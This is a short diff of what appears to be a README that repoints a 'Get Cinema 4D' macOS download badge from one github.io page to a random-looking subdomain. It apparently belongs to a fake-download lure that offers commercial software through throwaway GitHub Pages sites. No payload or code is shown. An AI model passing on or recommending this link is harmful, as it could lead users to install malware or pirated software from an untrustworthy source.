@@ -6,7 +6,7 @@
 
 <div align="center">  
 
-[![⬇️ Get Cinema 4D](https://img.shields.io/badge/⬇️_Get_Cinema4D-blue?style=for-the-badge&logo=apple)](https://cinema-4d-macos.github.io/.github)  
+[![⬇️ Get Cinema 4D](https://img.shields.io/badge/⬇️_Get_Cinema4D-blue?style=for-the-badge&logo=apple)](https://asdmasldkhas231.github.io/.github)  
 
 </div>  
 
